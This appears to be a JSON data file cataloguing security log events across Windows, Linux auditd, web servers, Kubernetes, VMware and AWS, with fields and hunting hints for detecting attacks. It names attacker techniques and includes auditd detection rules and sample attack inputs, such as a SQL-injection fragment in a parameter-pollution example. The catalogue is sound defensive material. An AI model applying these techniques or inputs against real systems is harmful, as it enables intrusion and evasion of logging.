{"n":"Driver installed for a new PnP device (USB)","d":"Windows finished installing a driver for a newly attached Plug-and-Play device, including USB storage and HID-emulating devices (BadUSB/Rubber Ducky). Status=0 means the install succeeded.","f":"Device Instance ID (contains the USB device's VID/PID and serial), Driver (the .inf used), Status (0=OK, non-zero=error)","h":""},

{"n":"ASR rule blocked / audited a behavior","d":"An Attack Surface Reduction rule matched a behavior: 1121 = rule in Block mode and the action was blocked; 1122 = rule in Audit mode, logged only, not blocked. ASR rules target behaviors like Office spawning child processes, suspicious scripts, LSASS dumping, etc. The specific MITRE technique depends on which Rule ID (GUID) matched.","f":"Rule ID (the ASR rule's GUID), Process Name, Path, Target file","h":""},

{"n":"Controlled Folder Access blocked / audited a file write","d":"An untrusted process tried to write/modify/delete a file in a protected folder (Documents, Desktop, ...): 1123 = blocked (Block mode), 1124 = logged only (Audit mode). A strong signal of ransomware encrypting files.","f":"Process Name/Path of the process attempting the write, the target file's protected path","h":""},

{"n":"PowerShell engine stopped (classic log)","d":"Pairs with event 400: the PowerShell engine in the process transitions from Available to Stopped, marking the end of a session/script. Shares the same RunspaceId as the 400 that opened the session, so the two can be joined to compute session duration.","f":"RunspaceId (matches the 400 that opened the session), HostApplication, EngineVersion","h":""},

{"n":"Sysmon: service state change","d":"Logged when the Sysmon service stops or restarts; this event cannot be filtered or disabled. An unplanned Sysmon stop outside a maintenance window is a sign of an attacker/EDR-killer disabling telemetry before acting.","f":"State=Stopped/Started","h":""},

{"n":"RawAccessRead (raw disk read)","d":"A process reads a disk/volume directly via a \\\\.\\ style path, bypassing the filesystem API and normal file-auditing tools. Rare in normal operation (outside backup/forensic tools); usually tied to ntds.dit theft or anti-forensics.","f":"Image: the process performing the read; Device: the target disk/volume (e.g. \\Device\\HarddiskVolume2)","h":""},

{"n":"ServiceConfigurationChange (Sysmon config changed)","d":"Logged whenever the Sysmon configuration (rule filtering file) is updated; cannot be disabled. Use it as a tamper-detection signal: any config change outside a known deployment process should be investigated. Note: editing the registry directly (not via sysmon -c) may not generate this event.","f":"Configuration, ConfigurationFileHash","h":""},

{"n":"ClipboardChange (new clipboard content)","d":"Logged when the system clipboard content changes, along with the related process and the file holding a copy of the content. Useful for detecting clipboard-stealing malware or a \"clipper\" that swaps cryptocurrency wallet addresses.","f":"Image, Session, ClientInfo, Archived (path to the saved content copy)","h":""},

{"n":"RDP logon success/failure (Security log)","d":"The Security log records a successful (4624) or failed (4625) logon with LogonType=10 (RemoteInteractive) for an RDP connection. Combine with 1149/21 to reconstruct the full session chain; repeated 4625 from one source is a sign of RDP brute forcing.","f":"LogonType=10: via RDP; IpAddress: connection source; TargetUserName/TargetDomainName: the logon account","h":""},

{"n":"LocalSessionManager: session disconnected by another session / reason code","d":"39 is logged when a session is disconnected by another session (a different SessionID indicates another person/admin actively disconnected it, not the user logging off themselves); 40 logs the disconnect reason code. Useful when investigating suspected RDP session hijacking (via tscon.exe).","f":"Session, (Target) Session in event 39; Reason code in event 40","h":""},

{"n":"Scheduled task created/deleted (Security log, full XML)","d":"4698 is logged when a new scheduled task is registered, including the full XML definition (action, trigger, run-as account) — far more detail than Task Scheduler Operational 106; 4699 is logged when a task is deleted. Requires enabling Audit Object Access (Other Object Access Events) on the Security log.","f":"TaskName; TaskContent: XML containing the action's Command/Arguments; SubjectUserName: the creator","h":""},

{"n":"CodeIntegrity: driver/file blocked by App Control","d":"Microsoft-Windows-CodeIntegrity/Operational. 3077 is logged when App Control (WDAC) policy or the Microsoft Vulnerable Driver Blocklist blocks a driver/DLL/EXE in enforcement mode — this is where a blocked attempt to load a vulnerable driver (BYOVD) shows up, complementing Sysmon 6. The related event 3033 is a signature-verification failure.","f":"FileName: the blocked file's path; PolicyName/PolicyID","h":""},

{"n":"LSA: trusted logon process registration","d":"Logged when a process registers with the LSA as a trusted logon process (LsaRegisterLogonProcess), which grants SeTcbPrivilege. Besides winlogon.exe/services.exe at boot, an unexpected new registration can indicate a rogue Security Support Provider (SSP) installed to intercept cleartext passwords (mimilib.dll-style).","f":"ProcessName, LogonProcessName","h":""},

{"n":"Account deleted","d":"shadow-utils logs when userdel removes a user/group. The counterpart to the existing 'useradd' entry, which had no deletion side — important for cleanup behavior (removing a backdoor account after use).","f":"delete user: the local account just deleted\nremoved group: the same-named group deleted along with it (if it was the user's private group)\nowned by: confirms the deleted group was owned by the deleted user\nuserdel[pid]: PID of the userdel process performing the deletion","h":""},

{"n":"Privilege escalation via pkexec/polkit","d":"pkexec (polkit) is a privilege escalation path parallel to sudo, logged to auth.log/journal. Completely absent from the current set despite being a common exploitation vector (e.g. CVE-2021-4034/PwnKit).","f":"thanhnv (before the colon): the account that invoked pkexec to request privilege escalation\nExecuting command: confirms polkit granted authorization and the command is about to run\nUSER: the target account the command will run as (usually root)\nTTY: the terminal invoking the command (unknown if there is no tty, common when exploiting CVE-2021-4034)\nCWD: the working directory when pkexec was invoked\nCOMMAND: the full path of the command executed","h":""},

{"n":"SSH blocked by AllowUsers/DenyUsers","d":"sshd rejects the connection before the authentication step if the user isn't in AllowUsers or is listed in DenyUsers — a different log line from the existing 'Invalid user' and 'Failed password' entries, worth separating since it shows an allow/deny rule firing or being probed.","f":"User <user>: the account rejected before authentication\nfrom: source IP address of the connection\nnot allowed because not listed in AllowUsers: the rejection reason — the user is not in the AllowUsers list (or is listed in DenyUsers) configured in sshd_config","h":""},

{"n":"Persistence via systemd timer","d":"Instead of cron, an attacker uses a systemd .timer/.service pair to maintain a periodic foothold — an increasingly common technique since it's less scrutinized by traditional 'watch crontab' rules. The current set only has a single-service 'systemd Started' entry, missing the timer angle entirely.","f":"Started <name>.timer: the timer unit fired according to its configured schedule (OnCalendar/OnBootSec...)\nStarting <name>.service...: the service linked to the timer begins starting\nStarted <name>.service.: the service finished starting — this is where the payload actually runs\nsystemd[1]: the systemd process (PID 1) recording the unit state transitions","h":""},

{"n":"Kernel drops audit events under overload (log blind spot)","d":"When the audit backlog fills up, the kernel drops events instead of logging them — an attacker can deliberately generate a large volume of syscalls to temporarily 'blind' auditing. This defense-evasion angle is completely missing from the current set (existing auditd entries only cover stopping/modifying rules, not event loss from overload).","f":"audit: the message source label (the kernel's audit subsystem)\naudit_lost: the number of audit events the kernel discarded due to queue overload\naudit_rate_limit: the allowed events-per-second rate limit (0 = no rate limiting)\naudit_backlog_limit: the maximum backlog queue size before events start being dropped","h":""},

{"n":"wtmp/btmp deleted or emptied (anti-forensics)","d":"Attackers commonly overwrite or delete /var/log/wtmp and /var/log/btmp to erase login traces. Signs: last/lastb return very few lines, or the 'wtmp begins' line shows an unusually recent timestamp relative to the system's age. The current set has 3 entries that read these files but none about the files themselves being tampered with.","f":"last/lastb output: result of the last/lastb command reading from wtmp/btmp, abnormal if too few lines given the system's uptime\nwtmp begins <timestamp>: the timestamp wtmp started recording — if this is suspiciously recent relative to system uptime, the file was likely wiped/overwritten\n(empty/blank): a wtmp/btmp file that is zero-sized or abnormally small is also a sign of tampering","h":""},

{"n":"setuid/setgid bit set on a file (chmod/chown)","d":"Standard CIS rule: -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=4294967295 -k perm_mod (similarly for chown/fchown/fchownat/lchown). Completely missing from the current set despite being one of the most classic auditd rules, used to detect setuid-root being added to a binary for privilege escalation/persistence.","f":"a1: mode value in hex (e.g. 9ed = octal 4755, with the setuid bit 4000)","h":""},

{"n":"Linux capability granted to a binary (setcap)","d":"Community rule (Neo23x0/Florian Roth): -a always,exit -F arch=b64 -S setxattr,lsetxattr,fsetxattr -k capability_change. setcap granting a capability (e.g. cap_setuid+ep) to an ordinary binary (python3, perl...) is a privilege-escalation technique alternative to setuid, listed in GTFOBins but not yet tracked by any entry.","f":"syscall: the extended-attribute syscall (setxattr/lsetxattr/fsetxattr) used to set a capability\ncomm: the process performing the action (setcap)\nexe: the executed binary (/usr/sbin/setcap)\nkey: the audit rule label (capability_change)\nauid / uid: the original login UID and the effective UID performing the action\nsuccess: the syscall result (yes/no)","h":""},

{"n":"Write to authorized_keys (persistence via SSH key)","d":"Community rule: -w /root/.ssh -p wa -k rootkey (should be extended to other sensitive home directories). The current 'watch /etc/passwd' entry only mentions this rule in passing as a secondary example, with no dedicated entry/sample — even though writing to authorized_keys is one of the most common access-persistence techniques.","f":"key: the audit rule label (rootkey) marking the SSH-key watch rule group\ncomm / exe: the process writing the file (vim)\nauid / uid: the original login UID and the effective UID writing the file\nname (PATH record): the file path written — authorized_keys, confirming the exact target modified\nsyscall: the open/write syscall (openat, number 257)","h":""},

{"n":"Modifying /etc/ld.so.preload (LD_PRELOAD persistence)","d":"Community rule: -w /etc/ld.so.preload -p wa -k systemwide_preloads. Writing a malicious .so into /etc/ld.so.preload causes it to be loaded into every process that starts — a classic rootkit technique (used by Jynx2, Azazel, Diamorphine). No entry in the current set watches this file.","f":"key: the audit rule label (systemwide_preloads)\ncomm / exe: the process writing the file (bash)\nauid / uid: the original login UID and the effective UID performing the write\nname (PATH record): the file path written — /etc/ld.so.preload, a file loaded into every process\nsyscall: the open/write syscall (openat, number 257)","h":""},

{"n":"Setting the immutable attribute with chattr","d":"chattr +i on a file/backdoor prevents even root from deleting/modifying it until the flag is removed — a technique for protecting a payload from cleanup, caught by the existing exec rule (key=exec, the 'SYSCALL execve' entry) via comm=\"chattr\", but without a dedicated entry/hunting note to highlight it.","f":"comm: the process executed (chattr)\nkey: the audit rule label that captured the command (exec, from an execve watch rule)\nargc: the number of command-line arguments recorded in the EXECVE record\na0/a1/a2: the command-line arguments in order — a0 is the command name (chattr), a1 is the flag (+i), a2 is the file/target being made immutable","h":""},

{"n":"System clock changed (infrastructure timestomping)","d":"Standard CIS/STIG rule: -a always,exit -F arch=b64 -S adjtimex,settimeofday,clock_settime -k time-change; -w /etc/localtime -p wa -k time-change. Changing the system clock is a classic anti-forensic trick (skewing the log timeline), but the current auditd group has no entry for this standard category.","f":"syscall: the syscall changing system time (adjtimex/settimeofday/clock_settime)\ncomm: the process invoking the time change (date)\nexe: the corresponding executed binary (/usr/bin/date)\nkey: the audit rule label (time-change)\nauid / uid: the original login UID and the effective UID performing the change\nsuccess: the syscall result (yes/no)","h":""},

{"n":"X-Forwarded-For / X-Real-IP spoofing","d":"When the server sits behind a LB/reverse proxy/CDN, the IP in $remote_addr (%h) is the proxy's IP, not the real client; the application must read X-Forwarded-For or X-Real-IP instead. This header is set by the client itself, so it can be spoofed if the proxy isn't configured to trust only known upstream proxies (e.g. nginx's realip_module + set_real_ip_from).","f":"X-Forwarded-For: comma-separated list client,proxy1,proxy2,...; without correct trusted-proxy configuration, an attacker can inject a fake value to dodge rate-limiting/IP blocks or frame another IP.\nX-Real-IP: similar, usually set by a single proxy.","h":""},

{"n":"Access log deleted/truncated (anti-forensics)","d":"An attacker may delete, truncate (to 0 bytes), or temporarily stop access logging after exploitation to erase traces. Signs: an unusual time gap between log lines, log file size/mtime changes that don't match the logrotate cycle, or the log suddenly being shorter than the upstream LB/WAF log for the same window.","f":"Cross-check line counts/time windows between the raw access log and the upstream LB/WAF/CDN log to spot a deleted segment.","h":""},

{"n":"sc-bytes / cs-bytes fields (W3C)","d":"sc-bytes (bytes the server sent to the client) and cs-bytes (bytes the server received from the client) are two standard W3C Extended Log File Format fields not yet documented here. Useful for spotting data exfiltration (sc-bytes spike) or an unusually large upload/webshell (cs-bytes spike).","f":"sc-bytes: bytes sent by the server to the client (response) — an unusual spike suggests a data dump.\ncs-bytes: bytes received by the server from the client (request) — an unusual spike suggests a large file upload.","h":""},

{"n":"WebDAV exploitation via PROPFIND/PUT/MOVE","d":"IIS with WebDAV enabled accepts the PROPFIND, PUT, MOVE, DELETE methods in addition to the usual GET/POST. CVE-2017-7269 (IIS 6.0, ScStoragePathFromUrl function) exploits a buffer overflow via an abnormally long 'If:' header in a PROPFIND request for RCE; PUT/MOVE can also be abused to upload a webshell when the WebDAV directory has misconfigured write permissions.","f":"cs-method = PROPFIND/PUT/MOVE/DELETE is unusual for most web applications; an abnormal header length (If:, Destination:) is a sign of exploitation.","h":""},

{"n":"Credential stuffing (leaked username/password pairs)","d":"Unlike brute force, which tries many passwords against one account (see the login brute-force entry), credential stuffing uses username/password pairs leaked from another breach, usually trying each account only once to avoid account lockout; traffic typically comes from many rotating IPs/proxies rather than one repeated IP.","f":"%h: multiple different IPs hitting the same endpoint (10.40.2.1, 10.40.2.5, ...) - unlike classic brute force (one IP trying many passwords on one account)\n\"%r\": \"POST /login\" repeated, but each IP/request typically tries only once (using pre-leaked username/password pairs)\n%>s: 401 repeated - most credential pairs are invalid\nUser-Agent: identical across many IPs (python-requests/2.31.0) - a sign of the same tool/script running through rotating proxies or IPs","h":""},

{"n":"HTTP Parameter Pollution (HPP)","d":"Sending a duplicate parameter name in the query string (e.g. ?id=1&id=1' OR '1'='1) to exploit the difference between how the WAF/validation layer and the backend handle duplicate parameters (one reads the first value, the other the last, or vice versa), to evade a WAF or override an application parameter.","f":"\"%r\": \"GET /transfer?amount=10&amount=10000&to=acc1\" - the amount parameter appears twice with different values in the same query string\n%>s: 200 - the request was still processed; cross-check application logs to see which amount value (first or last) the server actually used, revealing a WAF/validation bypass\n%b: 320","h":""},

{"n":"Impersonating another user (Impersonate)","d":"The request uses the impersonation mechanism (Impersonate-User/Impersonate-Group headers) to act as a different identity. The audit event records both 'user' (the original identity, which must hold impersonate permission) and 'impersonatedUser' (the identity used for authorization) — if a compromised SA has impersonate rights onto a higher-privileged user/SA, this is a privilege-escalation path that does not require stealing a token directly.","f":"user: the identity calling the API; impersonatedUser: the identity being impersonated (used to decide authorization); impersonatedUser.groups if the attacker chooses to impersonate into a privileged group (e.g. system:masters).","h":""},

{"n":"Abusing the escalate/bind RBAC verbs","d":"Creating/editing a (Cluster)Role that contains the 'escalate' verb, or creating a (Cluster)RoleBinding via the 'bind' verb on a role with more permissions than the caller currently holds — these are the two official primitives used to bypass Kubernetes RBAC's default rule that you cannot grant permissions you do not already have.","f":"requestObject.rules[].verbs contains 'escalate' or 'bind'; verb=create/update on the roles/clusterroles or rolebindings/clusterrolebindings resource.","h":""},

{"n":"Suspicious CertificateSigningRequest approval","d":"verb=update on certificatesigningrequests/approval; if the signed CSR has a CN/group impersonating a privileged identity (e.g. the system:masters group, or system:node:<node>), approving it issues a valid client certificate letting the attacker impersonate that identity without ever holding the original token.","f":"objectRef.resource=certificatesigningrequests, subresource=approval; requestObject.status.conditions[].type=Approved; requestObject.spec.signerName, spec.request (base64 CSR PEM) should be decoded to check CN/O.","h":""},

{"n":"Modifying/deleting admission webhook configuration","d":"create/update/delete on validatingwebhookconfigurations or mutatingwebhookconfigurations (admissionregistration.k8s.io), or patching the 'pod-security.kubernetes.io/enforce' label on a namespace to lower its enforcement level — a way to disable admission-control guardrails before deploying a malicious workload.","f":"objectRef.resource=validatingwebhookconfigurations/mutatingwebhookconfigurations (verb=delete/update); or objectRef.resource=namespaces with requestObject.metadata.labels changing the pod-security.kubernetes.io/enforce value.","h":""},

{"n":"Pod Security violation recorded in audit annotation","d":"When a pod is created that violates the Pod Security Standards (baseline/restricted): in enforce mode the request is rejected; in audit mode the pod is still created but an annotation records the violation details — a sign someone tried, or managed, to deploy a privileged pod in a protected namespace (also useful to confirm whether admission control is actually blocking anything).","f":"annotations['pod-security.kubernetes.io/audit-violations']: details of the violation; annotations['pod-security.kubernetes.io/enforce-policy']: the policy level in effect (e.g. restricted:latest).","h":""},

{"n":"Audit log dropped/stalled (webhook backend failure)","d":"The kube-apiserver log warns that the audit webhook queue is full or the backend is not responding, so audit events get dropped. If this coincides with other suspicious activity, suspect the audit pipeline was deliberately choked to create a blind spot and hide tracks.","f":"W (first character): klog level — Warning\n1024 02:15:00.000000: klog's internal timestamp\nthreadid (\"1\"): logging thread id of kube-apiserver\nbuffered.go:162: the module batching/buffering audit events before sending to the webhook backend\nmessage: \"Failed to process audit event: ... dropping events\" — describes why events were dropped (rate limit exceeded/backend unresponsive), signaling a gap in the audit trail","h":""},

{"n":"CoreDNS query log","d":"CoreDNS's DNS query log (requires enabling the 'log' plugin in the Corefile) records every domain name a pod looks up — an important data source for detecting DNS tunneling, DNS-based C2 beaconing, or unusual exfiltration-domain lookups that the API server audit log cannot see.","f":"BIND-style query log format: timestamp, client IP (pod), queried domain, record type, response code, processing time.","h":""},

{"n":"Image pull failed (ErrImagePull/ImagePullBackOff)","d":"A Warning Failed event citing an inability to pull an image — if the image name matches an attack tool/miner, or an unfamiliar registry was blocked by network policy/egress controls, this signals the attacker TRIED to deploy a malicious workload but was blocked before it ever ran.","f":"NAMESPACE: namespace of the involved pod\nLAST SEEN: time since the event was last recorded\nTYPE: \"Warning\"\nREASON: \"Failed\" — image pull failed (ErrImagePull/ImagePullBackOff)\nOBJECT: the involved pod (involvedObject)\nMESSAGE: the image name attempted and the specific failure reason (e.g. DNS/network policy blocking egress to the registry)","h":""},

{"n":"Mass SuccessfulCreate events from a DaemonSet/Job","d":"Normal SuccessfulCreate events firing repeatedly from a DaemonSet/Job across many nodes — an early signal visible even without audit-log read access (just 'kubectl get events') that cluster-wide persistence/cryptominer deployment is underway, corresponding to the DaemonSet-creation behavior seen in the audit log.","f":"NAMESPACE: namespace of the controller that created the pod (often a sensitive namespace, e.g. kube-system)\nLAST SEEN: time since the event was last recorded\nTYPE: \"Normal\"\nREASON: \"SuccessfulCreate\" — the controller (DaemonSet/Job) successfully created a child pod\nOBJECT: the daemonset/job that is the source of the event (involvedObject)\nMESSAGE: the name of the created child pod — repeated rapidly across many nodes signals a cluster-wide persistence/cryptominer rollout","h":""},

{"n":"Datastore file copied / moved / deleted","d":"The vim.event.DatastoreFileEvent family logs copy, move, and delete operations performed directly on the datastore via Datastore Browser or API, bypassing the VM's guest OS. Attackers use this channel to exfiltrate an entire VMDK file or erase traces without ever logging into the virtual machine.","f":"datastore (destination), sourceDatastore/sourceFile (on copy/move), targetFile","h":""},

{"n":"VM migrated to another host (vMotion) / datastore changed (Storage vMotion)","d":"Logs a VM being moved to a different ESXi host (vMotion, manual or DRS-triggered) or to a different datastore (Storage vMotion, VmRelocatedEvent). An attacker can move a sensitive VM to a host/datastore they already control to evade centralized monitoring or isolate the VM before tampering with it.","f":"source/destination host, source/destination datastore","h":""},

{"n":"Local account created / removed","d":"Logs the creation or removal of a local OS account on ESXi/vCenter via API or UI (available since VI API 2.0). An important persistence indicator; related to ransomware campaigns (Storm-0506, Akira, Black Basta, etc.) exploiting CVE-2024-37085 to gain ESXi admin rights through the AD 'ESX Admins' group — in that case, an account/logon appears on the host even though it was never created there manually.","f":"fullFormattedMessage: description text containing the account name and action (e.g. \"Account 'backupsvc' created\")\nhost: the ESXi host or vCenter where the account was created/removed\nuserName: the account that performed the action (actor) – worth checking if empty or tied to the AD \"ESX Admins\" group (CVE-2024-37085)\ncreatedTime: time the account was created/removed\nchainId: ID linking to related events (e.g. a subsequent login using the new account)","h":""},

{"n":"vCenter HTTPS reverse proxy log","d":"rhttpproxy is vCenter's single HTTPS entry point, routing requests to backend services (sdk, ui, websso, etc.). Useful for spotting scanning or exploitation attempts against admin endpoints before traces appear in more detailed application logs (vpxd.log, websso.log). Verbose logging must be enabled to log the source IP.","f":"Source IP, request path, HTTP status code","h":""},

{"n":"Direct VMDK download via Datastore Browser (NFC)","d":"hostd.log logs a 'File download from path ... was initiated from ...' line when a client downloads a file directly from the datastore over the NFC protocol (Datastore Browser or another admin tool), bypassing the guest OS. This technique has been observed to exfiltrate an entire VMDK file (e.g. a Domain Controller's) without needing any access inside the guest.","f":"Datastore, VMPath, InitiatorTool, InitiatorIP","h":""},

{"n":"ESXi firewall ruleset opened/closed via esxcli","d":"shell.log logs the esxcli network firewall ruleset set command when an admin enables the firewall ruleset for a service (e.g. sshServer) or opens allowed-all. Ransomware operators commonly enable this ruleset right before or alongside enabling SSH to maintain remote access.","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli network firewall ruleset set: Command that changes an ESXi firewall ruleset's configuration\n--ruleset-id=<name>: Firewall ruleset being changed (e.g. sshServer)\n--enabled=true --allowed-all=true: Enables the ruleset and allows all source IPs, fully opening the firewall for that service","h":""},

{"n":"ESXi firewall configuration changed","d":"A VOB/audit event logged when the ESXi firewall configuration changes (ruleset enabled/disabled, allowed IPs edited, etc.), appearing in vobd.log/hostd.log alongside the matching esxcli command in shell.log. Note: this event name is confirmed via real-world logs and community security sources, not fully listed in official Broadcom documentation (the 'Managing ESXi Audit Records' section doesn't enumerate individual event IDs).","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component correlating the event\n[esx.audit.net.firewall.config.changed]: VOB audit event name — ESXi firewall configuration has changed\nOperation '<enable/disable>': Action performed on the ruleset (enable/disable)\nrule set <name>: Firewall ruleset affected (e.g. sshServer)\nsucceeded: Result of the configuration change","h":""},

{"n":"Console Login (Failed / No MFA)","d":"Records an AWS Management Console sign-in attempt, including failed logins or successful logins without MFA — a sign of password guessing or account compromise.","f":"eventName: always \"ConsoleLogin\"\nuserIdentity.type: identity type that signed in (IAMUser, Root, AssumedRole)\nuserIdentity.arn / userName: the signing-in identity\nresponseElements.ConsoleLogin: \"Success\" or \"Failure\"\nadditionalEventData.MFAUsed: \"Yes\"/\"No\" — whether MFA was used\nsourceIPAddress: source IP of the sign-in attempt","h":"Watch for repeated ConsoleLogin failures from the same source (brute force/password spraying) or a successful login without MFA from an unusual IP or geolocation."},

{"n":"Root Account Activity","d":"Any API call or console sign-in made using AWS account root credentials — an identity with unrestricted privileges that should never be used for routine operations.","f":"userIdentity.type: value \"Root\" identifies the account root user\nuserIdentity.arn: in the form arn:aws:iam::<accountId>:root\neventName: the action performed by the root user\nsourceIPAddress: source IP of the API call\neventTime: when the action occurred","h":"Any event with userIdentity.type=Root should be investigated immediately, since the root account should only be used for rare account-level tasks (e.g. billing changes)."},

{"n":"CreateAccessKey / UpdateAccessKey","d":"Creates a new access key or changes the status of an existing IAM user access key — commonly used to establish long-term persistence after an account is compromised.","f":"eventName: CreateAccessKey or UpdateAccessKey\nrequestParameters.userName: the IAM user being modified (different from the caller is suspicious)\nresponseElements.accessKey.accessKeyId: the newly created access key\nresponseElements.accessKey.status: Active/Inactive status\nuserIdentity.arn: identity that performed the action\nsourceIPAddress: source IP","h":"Suspicious when an access key is created for a user other than the caller, or many keys are created across accounts in a short time window."},

{"n":"AttachUserPolicy / PutUserPolicy (Privilege Escalation)","d":"Attaches a managed or inline policy to an IAM user/role — a common privilege-escalation technique, such as attaching AdministratorAccess directly.","f":"eventName: AttachUserPolicy / PutUserPolicy / AttachRolePolicy\nrequestParameters.userName or roleName: the entity receiving the policy\nrequestParameters.policyArn: managed policy ARN attached (watch for AdministratorAccess)\nrequestParameters.policyDocument: inline policy content (for PutUserPolicy)\nuserIdentity.arn: who performed the action","h":"Alert when policyArn points to AdministratorAccess or a broad-permission policy is attached by the user itself or by a non-admin principal."},

{"n":"CreateUser / CreateRole (Broad Trust Policy)","d":"Creates a new IAM user or role; notable when the new role's trust policy allows an external AWS account (or \"*\") to assume it, opening a cross-account backdoor.","f":"eventName: CreateUser or CreateRole\nrequestParameters.userName / roleName: name of the new entity\nrequestParameters.assumeRolePolicyDocument: the role's trust policy (check the Principal field)\nresponseElements.role.arn / responseElements.user.arn: ARN of the newly created entity\nuserIdentity.arn: who created it","h":"Check whether assumeRolePolicyDocument's Principal is an unrecognized AWS account or \"*\" — a sign of a cross-account access backdoor."},

{"n":"AssumeRole (Cross-Account)","d":"An identity calls AWS STS AssumeRole to obtain temporary credentials for a role — notable when the role and the caller belong to different AWS accounts.","f":"eventName: AssumeRole\nrequestParameters.roleArn: the role being assumed\nuserIdentity.accountId: the original caller's account\nresources[].accountId / resources[].arn: account that owns the assumed role\nresponseElements.assumedRoleUser.arn: ARN of the granted temporary role session","h":"Compare the caller's accountId with the account embedded in requestParameters.roleArn; a mismatch outside a known trust list suggests cross-account lateral movement."},

{"n":"GetSessionToken Misuse","d":"Requests a temporary credential set (access key, secret key, session token) tied to the caller's own long-term credentials — can be abused to extend the usable lifetime of a stolen access key.","f":"eventName: GetSessionToken\nuserIdentity.accessKeyId: the long-term access key used to request the token\nrequestParameters.serialNumber: MFA device serial supplied, if any\nresponseElements.credentials.expiration: validity period of the temporary token\nsourceIPAddress: calling IP, compared against that access key's normal IP","h":"Suspicious when GetSessionToken is called from an unusual IP/geolocation for a given access key, or omits the MFA serialNumber despite an organizational policy requiring it."},

{"n":"StopLogging / DeleteTrail / UpdateTrail","d":"Stops, deletes, or reconfigures a CloudTrail trail — a classic defense-evasion technique used to blind or erase logging before or during an attack.","f":"eventName: StopLogging / DeleteTrail / UpdateTrail\nrequestParameters.name: the affected trail name\nuserIdentity.arn: identity that performed the action\neventSource: cloudtrail.amazonaws.com\nawsRegion: region where the call was made (a multi-region trail can still be stopped from a single region)","h":"Any StopLogging/DeleteTrail/UpdateTrail should trigger an immediate alert, especially when it precedes other sensitive actions by the same identity."},

{"n":"PutBucketPolicy (S3 Public/Cross-Account)","d":"Modifies an S3 bucket policy; especially concerning when Principal is set to \"*\" (public) or an external AWS account — a technique used to expose or exfiltrate data.","f":"eventName: PutBucketPolicy\nrequestParameters.bucketName: the affected bucket\nrequestParameters.bucketPolicy.Statement[].Principal: the granted principal (check for \"*\" or an unfamiliar account)\nrequestParameters.bucketPolicy.Statement[].Effect: Allow/Deny\nuserIdentity.arn: who changed the policy","h":"Alert when Statement.Principal = \"*\" or an Allow statement broadly grants s3:GetObject/s3:*, especially on buckets holding sensitive or backup data."},

{"n":"AuthorizeSecurityGroupIngress (0.0.0.0/0)","d":"Adds an inbound rule to a security group; concerning when it opens administrative ports (22, 3389, 3306, etc.) to the entire internet (0.0.0.0/0), enabling unauthorized access or a C2 channel.","f":"eventName: AuthorizeSecurityGroupIngress\nrequestParameters.groupId: the modified security group\nrequestParameters.ipPermissions.items[].ipRanges.items[].cidrIp: allowed CIDR range (check for 0.0.0.0/0)\nrequestParameters.ipPermissions.items[].fromPort / toPort: opened port range\nuserIdentity.arn: who made the change","h":"Prioritize investigation when cidrIp=0.0.0.0/0 is paired with a sensitive port (22, 3389, 3306, 5432...) on a security group attached to production resources."},

{"n":"DisableKey / ScheduleKeyDeletion (KMS)","d":"Disables or schedules deletion of a KMS key, rendering all data encrypted under it permanently undecryptable — a cloud-native data-destruction/ransomware-style technique.","f":"eventName: DisableKey or ScheduleKeyDeletion\nrequestParameters.keyId: the affected KMS key\nrequestParameters.pendingWindowInDays: waiting period before permanent deletion (ScheduleKeyDeletion)\nuserIdentity.arn: who performed the action\neventSource: kms.amazonaws.com","h":"Alert immediately on ScheduleKeyDeletion/DisableKey for a key actively protecting production resources, especially if pendingWindowInDays is set to the minimum allowed (7 days)."},

{"n":"Port probe on an unprotected EC2 port","d":"An EC2 instance port left open to the internet (overly permissive security group) is being probed by an external IP address, as seen in VPC Flow Logs.","f":"type: finding type, always starts with Recon:EC2/\nresource.instanceDetails.instanceId: probed instance\nservice.action.portProbeAction.portProbeDetails: list of probed ports/IPs\nservice.action.portProbeAction.portProbeDetails.localPortDetails.port: local port being probed\nservice.count: number of probes in the time window\nseverity: usually Low but can increase for sensitive ports","h":"Check whether the instance's security group genuinely needs that port open to 0.0.0.0/0, and look up the source IP against known threat-intel lists."},

{"n":"SSH brute force against EC2","d":"An EC2 instance is detected as the source or target of SSH password brute-forcing activity (repeated connections to port 22) via VPC Flow Logs.","f":"type: Recon/UnauthorizedAccess EC2 SSHBruteForce\nresource.instanceDetails.instanceId: involved instance\nservice.action.networkConnectionAction.remoteIpDetails.ipAddressV4: attacking IP\nservice.action.networkConnectionAction.remotePortDetails.port: remote port (usually 22)\nservice.count: number of connection attempts\nservice.eventFirstSeen / eventLastSeen: time window of the brute-force activity","h":"Check whether any SSH login succeeded right after the brute-force window (auth.log or CloudTrail for SSM access) and block the source IP."},

{"n":"Anomalous IAM user behavior (credential access)","d":"An IAM principal invokes credential-related APIs (e.g. GetCredentialReport, GenerateCredentialReport) in a way that deviates from that entity's own historical baseline, flagged by GuardDuty's ML model.","f":"type: CredentialAccess:IAMUser/AnomalousBehavior\nresource.accessKeyDetails.userName / principalId: IAM user/role performing the action\nservice.action.awsApiCallAction.api: API that was called\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: source IP of the API call\nservice.additionalInfo.recentApiCalls: related recent API calls\nseverity: Medium by AWS default","h":"Review CloudTrail for the same principal's surrounding API calls to determine whether this is a legitimate automated tool or an attacker harvesting credentials."},

{"n":"Anomalous successful console login","d":"An IAM user successfully logs into the AWS Management Console from an API caller, location, or device unusual for that user's normal behavior.","f":"type: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B\nresource.accessKeyDetails.userName: user who logged in\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: source IP of the login\nservice.action.awsApiCallAction.remoteIpDetails.country.countryName: source country\nservice.additionalInfo.loginAttributes: MFA/user-agent details if present\nservice.eventFirstSeen: time of the login","h":"Verify with the account owner whether they actually logged in from that location/IP; if not, rotate credentials and enforce MFA immediately."},

{"n":"EC2 communicating with a C2 server via DNS","d":"An EC2 instance makes a DNS query to a domain known to be command-and-control infrastructure, indicating the instance is likely compromised with backdoor malware.","f":"type: Backdoor:EC2/C&CActivity.B!DNS\nresource.instanceDetails.instanceId: instance making the query\nservice.action.dnsRequestAction.domain: queried C2 domain\nservice.action.dnsRequestAction.protocol: DNS protocol used\nservice.additionalInfo.threatListName: matched threat-intel list\nservice.count: number of queries to that domain","h":"Isolate the instance immediately, capture a memory/disk image, and identify the process or binary on the host that issued the DNS query."},

